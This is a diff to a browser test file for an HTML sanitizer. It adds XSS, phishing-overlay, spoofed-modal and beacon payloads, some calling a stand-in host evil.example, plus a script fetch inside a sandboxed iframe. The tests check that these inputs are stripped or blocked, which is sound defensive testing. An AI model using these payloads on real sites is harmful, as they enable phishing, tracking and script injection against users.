@@ -31,6 +31,10 @@ const HOSTILE = [
   { name: 'srcdoc reintroduction', payload: '<iframe srcdoc="<script>window.__xss=1<\/script>"></iframe>' },
   { name: 'object/embed', payload: '<object data="javascript:window.__xss=1"></object><embed src="x">' },
   { name: 'form with formaction', payload: '<form><button formaction="javascript:window.__xss=1">go</button></form>' }
+  ,{ name: 'fixed overlay', payload: '<div style="position:fixed;inset:0;z-index:2147483647;pointer-events:auto">Save failed. Sign in.</div>' }
+  ,{ name: 'external image beacon', payload: '<img src="https://evil.example/pixel?secret=1" style="position:fixed;width:9999px">' }
+  ,{ name: 'CSS URL beacon', payload: '<div style="background-image:url(https://evil.example/pixel)">x</div>' }
+  ,{ name: 'malicious application id', payload: '<div id="settingsModal" class="modal security-warning" role="dialog">Sign in to save</div>' }
 ];
 
 const FORBIDDEN = [/<script\b/i, /<svg\b/i, /<iframe\b/i, /<object\b/i, /<embed\b/i, /\son\w+\s*=/i, /javascript:/i, /vbscript:/i, /srcdoc/i, /expression\s*\(/i];
@@ -77,6 +81,32 @@ test('sanitizeUserHTML preserves safe, expected markup', async ({ page }) => {
   expect(out).toMatch(/rel="noopener noreferrer"/); // _blank hardened
   expect(out).toContain('<li>one</li>');
   expect(out).toContain('alt="pic"');
+  expect(out).not.toContain('src="https://example.com/a.png"'); // no passive image beacons
+});
+
+test('styles are property-allowlisted and user identifiers cannot collide with the app shell', async ({ page }) => {
+  await openApp(page);
+  const out = await page.evaluate(() => window.SutraDOMSafety.sanitizeUserHTML(
+    '<div id="settingsModal" class="modal login-dialog" role="dialog" style="position:fixed;inset:0;z-index:999999;cursor:none;pointer-events:auto;color:red;padding:12px">Save failed</div>'
+  ));
+  expect(out).not.toMatch(/id="settingsModal"/);
+  expect(out).not.toMatch(/class="modal(?:\s|\")/);
+  expect(out).not.toMatch(/role="dialog"/);
+  expect(out).not.toMatch(/position|z-index|cursor|pointer-events|inset/i);
+  expect(out).toMatch(/color:\s*red/i);
+  expect(out).toMatch(/padding:\s*12px/i);
+});
+
+test('sanitizer strips application hooks, escape targets, and abusive dimensions', async ({ page }) => {
+  await openApp(page);
+  const out = await page.evaluate(() => window.SutraDOMSafety.sanitizeUserHTML(
+    '<a href="https://example.com" target="_top" download data-sutra-action="delete">Open</a><img src="data:image/png;base64,AA==" width="999999" height="20">'
+  ));
+  expect(out).not.toContain('data-sutra-action');
+  expect(out).not.toContain('download');
+  expect(out).not.toContain('target="_top"');
+  expect(out).not.toContain('999999');
+  expect(out).toContain('height="20"');
 });
 
 test('setText never parses HTML; escapeHtml encodes metacharacters', async ({ page }) => {
@@ -109,7 +139,8 @@ test('isSafeUrl allows benign schemes and blocks script-bearing ones', async ({ 
       jsCase: f('JavaScript:alert(1)'),
       vbscript: f('vbscript:msgbox(1)'),
       dataHtml: f('data:text/html,<script>alert(1)<\/script>'),
-      dataImg: f('data:image/png;base64,iVBOR', { allowImageData: true })
+      dataImg: f('data:image/png;base64,iVBOR', { allowImageData: true }),
+      dataSvg: f('data:image/svg+xml,<svg onload=alert(1)>', { allowImageData: true })
     };
   });
   expect(verdicts.https).toBe(true);
@@ -122,6 +153,7 @@ test('isSafeUrl allows benign schemes and blocks script-bearing ones', async ({ 
   expect(verdicts.vbscript).toBe(false);
   expect(verdicts.dataHtml).toBe(false);
   expect(verdicts.dataImg).toBe(true);
+  expect(verdicts.dataSvg).toBe(false);
 });
 
 test('renderUserHTMLToFrame isolates content in a sandboxed iframe', async ({ page }) => {
@@ -138,8 +170,39 @@ test('renderUserHTMLToFrame isolates content in a sandboxed iframe', async ({ pa
     };
   });
   expect(res.isIframe).toBe(true);
-  expect(res.sandbox).toContain('allow-scripts');
-  expect(res.sandbox).not.toContain('allow-same-origin'); // cannot reach parent origin
+  expect(res.sandbox).toBe(''); // passive by default: no active capabilities
   expect(res.hasSrcdoc).toBe(true);
   expect(res.hostOnlyHasFrame).toBe(true);
+});
+
+test('iframe capabilities are explicit, warned, and never grant popup escape', async ({ page }) => {
+  await openApp(page);
+  const res = await page.evaluate(() => {
+    const unacknowledgedHost = document.createElement('div');
+    const unacknowledged = window.SutraDOMSafety.renderUserHTMLToFrame(
+      unacknowledgedHost,
+      '<script>fetch("https://evil.example")<\/script>',
+      { mode: 'interactive' }
+    );
+    const acknowledgedHost = document.createElement('div');
+    const acknowledged = window.SutraDOMSafety.renderUserHTMLToFrame(
+      acknowledgedHost,
+      '<form action="https://example.com"><button>go</button></form>',
+      { mode: 'interactive', capabilityAcknowledged: true }
+    );
+    return {
+      unacknowledgedSandbox: unacknowledged.getAttribute('sandbox'),
+      acknowledgedSandbox: acknowledged.getAttribute('sandbox'),
+      warning: acknowledgedHost.querySelector('.sutra-embed-capability-warning')?.textContent || '',
+      doc: acknowledged.getAttribute('srcdoc') || ''
+    };
+  });
+  expect(res.unacknowledgedSandbox).toBe('');
+  expect(res.acknowledgedSandbox).toContain('allow-scripts');
+  expect(res.acknowledgedSandbox).toContain('allow-forms');
+  expect(res.acknowledgedSandbox).not.toContain('allow-popups');
+  expect(res.acknowledgedSandbox).not.toContain('allow-same-origin');
+  expect(res.warning).toMatch(/scripts|requests|forms/i);
+  expect(res.doc).toContain("frame-src 'none'");
+  expect(res.doc).toContain("navigate-to 'none'");
 });
